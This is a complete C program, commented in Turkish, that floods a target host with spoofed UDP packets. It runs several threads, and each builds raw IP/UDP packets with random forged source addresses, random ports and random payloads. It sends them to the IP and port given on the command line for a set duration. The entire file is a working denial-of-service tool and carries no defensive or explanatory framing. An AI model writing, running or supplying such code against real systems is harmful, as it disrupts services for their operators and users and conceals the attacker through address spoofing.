#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

// IP + UDP header uzunlukları
#define IP_HDRLEN 20
#define UDP_HDRLEN 8

char *target_ip;
int target_port, packet_size, thread_count, duration;

// Checksum hesapla (IP/UDP)
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    for (; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) pthread_exit(NULL);

    // IP header'ını biz oluşturacağımız için
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(target_ip);

    char *packet = malloc(IP_HDRLEN + UDP_HDRLEN + packet_size);
    memset(packet, 0, IP_HDRLEN + UDP_HDRLEN + packet_size);

    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + IP_HDRLEN);
    char *data = packet + IP_HDRLEN + UDP_HDRLEN;

    time_t end = time(NULL) + duration;
    srand(time(NULL) ^ pthread_self());

    while (time(NULL) < end) {
        // Rastgele kaynak IP
        struct in_addr src_addr;
        src_addr.s_addr = rand();
        iph->saddr = src_addr.s_addr;

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(IP_HDRLEN + UDP_HDRLEN + packet_size);
        iph->id = rand();
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->daddr = dest.sin_addr.s_addr;

        iph->check = checksum(iph, IP_HDRLEN);

        // UDP
        udph->source = htons(rand() % 65535);
        udph->dest = htons(target_port + (rand() % 10)); // random hedef port
        udph->len = htons(UDP_HDRLEN + packet_size);
        udph->check = 0;

        // Rastgele payload
        for (int i = 0; i < packet_size; i++)
            data[i] = rand() % 256;

        sendto(sock, packet, IP_HDRLEN + UDP_HDRLEN + packet_size, 0,
               (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Kullanım: %s <ip> <port> <packet_size> <thread> <time>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    packet_size = atoi(argv[3]);
    thread_count = atoi(argv[4]);
    duration = atoi(argv[5]);

    pthread_t threads[thread_count];

    for (int i = 0; i < thread_count; i++)
        pthread_create(&threads[i], NULL, flood, NULL);

    for (int i = 0; i < thread_count; i++)
        pthread_join(threads[i], NULL);

    printf("Raw flood tamamlandı.\n");
    return 0;
}
